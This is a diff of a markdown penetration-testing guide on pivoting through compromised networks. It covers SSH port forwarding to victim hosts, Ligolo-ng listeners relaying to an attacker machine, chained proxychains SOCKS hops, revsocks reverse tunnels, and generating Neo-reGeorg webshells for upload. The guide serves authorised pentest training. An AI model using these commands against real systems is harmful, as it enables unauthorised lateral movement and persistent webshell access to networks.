@@ -30,30 +30,30 @@ Keep in mind that every tool and technique has its own advantages and limitation
 
 If you need a refresher on networking:
 
-*Local port forwarding*: Creates a local listening port that forwards traffic to a specified host and port reachable from the SSH server.
+**Local port forwarding**: Creates a local listening port that forwards traffic to a specified host and port reachable from the SSH server.
 
 For example, `ssh -L 1234:127.0.0.1:80 user@victim-front` opens port 1234 on the attacker's machine. Any connection to localhost:1234 is forwarded through the SSH tunnel to 127.0.0.1:80 on victim-front. 
-
 This is useful for accessing services that are only listening on the loopback interface (127.0.0.1) and are therefore not directly reachable from the network.
 
 
-*Remote port forwarding*: Opens a specific port on the remote machine and forwards any connections back to a specified port on the local machine.
+**Remote port forwarding**: Opens a specific port on the remote machine and forwards any connections back to a specified port on the local machine.
 
 This is less useful for pivoting in pentest, but let me give a little advice: when using remote port forwarding, you probably want to make the opened port available from the network and not only on the loopback, by using: `ssh -R 0.0.0.0:8080:127.0.0.1:80 user@victim-front`
 
 
-*SOCKS*: It is a protocol that encapsulates TCP and UDP traffic, allowing a SOCKS proxy to relay it between your local applications and remote hosts or services.
-
+**SOCKS**: It is a protocol that encapsulates TCP and UDP traffic, allowing a SOCKS proxy to relay it between your local applications and remote hosts or services.
 Either your application natively supports communicating with a SOCKS proxy, such as Firefox, or you can use a wrapper such as proxychains (e.g., `proxychains nc 10.0.0.1 8080`).
 
 
-*TUN interface*: A TUN interface creates a virtual network interface that routes IP traffic to a remote network. This gives your program full network access, as if the remote network were directly connected.
+**TUN interface**: A TUN interface creates a virtual network interface that routes IP traffic to a remote network. This gives your program full network access, as if the remote network were directly connected.
 
 
 To go deeper and enjoy neat diagrams explaining these concepts, I recommend the following resources:
+- Local, remote, and dynamic (SOCKS) port forwarding: [https://podalirius.net/en/articles/ssh-port-forwarding/](https://podalirius.net/en/articles/ssh-port-forwarding/)
+- TUN interface: [https://floating.io/2016/05/tuntap-demystified/](https://floating.io/2016/05/tuntap-demystified/)
 
-Local, remote, and dynamic (SOCKS) port forwarding: [https://podalirius.net/en/articles/ssh-port-forwarding/](https://podalirius.net/en/articles/ssh-port-forwarding/)
-TUN interface: [https://floating.io/2016/05/tuntap-demystified/](https://floating.io/2016/05/tuntap-demystified/)
+
+#### Pivot tools and techniques
 
 Throughout this guide, I will give commands to perform multiple pivots inside this network:
 
@@ -61,7 +61,7 @@ Throughout this guide, I will give commands to perform multiple pivots inside th
 
 
 #### Ligolo
-[Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+[Ligolo-ng on github](https://github.com/nicocha30/ligolo-ng)
 
 This is the most efficient and powerful tool I tested for this guide, yet it remains very easy to use.
 Ligolo creates a TUN interface on your attacking machine, making networks reachable through compromised hosts.
@@ -98,7 +98,7 @@ listener_add --addr 0.0.0.0:11601 --to attacker:11601
 listener_add --addr 0.0.0.0:9001 --to attacker:9001
 ```
 
-From there, compromise another host and repeat step 2, replacing the attacker's IP with the newly compromised hosts (first the *front* host, then the *middle* host).
+From there, compromise another host and go back to step 2, replacing the attacker's IP with the newly compromised hosts (first the *front* host, then the *middle* host).
 
 Some notes :
 - Ligolo proxy MUST run as root because it needs priviliges in order to set TUN interfaces.
@@ -142,7 +142,7 @@ Please see the SSH config part for more details.
 
 #### Proxychains
 
-[Proxychains](https://github.com/haad/proxychains)
+[Proxychains on github](https://github.com/haad/proxychains)
 
 `proxychains` is a wrapper that forces TCP connections from an application through one or more proxies. It is especially useful for tools that do not natively support SOCKS or HTTP proxies.
 
@@ -172,11 +172,12 @@ To use multiple pivots, simply add additional proxies in the order they should b
 ```
 [ProxyList]
 socks5 127.0.0.1 1080
-socks5 127.0.0.1 1080
+socks5 127.0.0.1 1081
 ```
 
 Each line describes one hop in the proxy chain, stating the type, host and listening port.
-The first entry is typically (but not necessarily) a SOCKS proxy running on your attacking machine. The second entry is reached through the first proxy, so 127.0.0.1:1080 refers to the SOCKS proxy listening on the *front* host.
+The first entry is typically (but not necessarily) a SOCKS proxy running on your attacking machine. The second entry is reached through the first proxy, so `127.0.0.1:1081` refers to the SOCKS proxy listening on the *front* host.
+Note that we could use the same port on each line, because in this example, each line describes a SOCKS proxy on a different machine with port 1080 free. I only used 1081 for clarity.
 
 
 ##### Proxychains usage
@@ -196,7 +197,7 @@ proxychains -f 02_middle.conf curl http://10.0.2.2
 
 #### revsocks
 
-[revsocks](https://github.com/kost/revsocks)
+[revsocks on github](https://github.com/kost/revsocks)
 
 If you need a SOCKS proxy on a compromised host but do not have SSH credentials, *revsocks* is an excellent choice. It is a reverse SOCKS5 tunneler with SSL/TLS support.
 
@@ -228,12 +229,12 @@ socks5 127.0.0.1 1080
 proxychains -f 01_front.conf curl http://10.0.1.2
 ```
 
-Once you compromised the *middle* host, go back to step 2.
+Once you compromised the *middle* host, go back to step 2 and repeat.
 
 
 
 #### HTTP tunnel
-[Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)
+[Neo-reGeorg on github](https://github.com/L-codes/Neo-reGeorg)
 
 Sometimes you may compromise a web server but be unable to obtain an interactive shell. If you can upload a web shell or execute server-side code, Neo-reGeorg allows you to turn that limited access into a SOCKS proxy, enabling you to pivot through the target network.
 
@@ -241,6 +242,15 @@ Sometimes you may compromise a web server but be unable to obtain an interactive
 1 - Generate webshell
 ```bash
 python neoreg.py generate -k password
+# Creates :
+# tunnel.ashx
+# tunnel.aspx
+# tunnel.cs
+# tunnel.go
+# tunnel.js
+# tunnel.jsp
+# tunnel.jspx
+# tunnel.php
 ```
 
 2 - Upload the webshell according the target stack
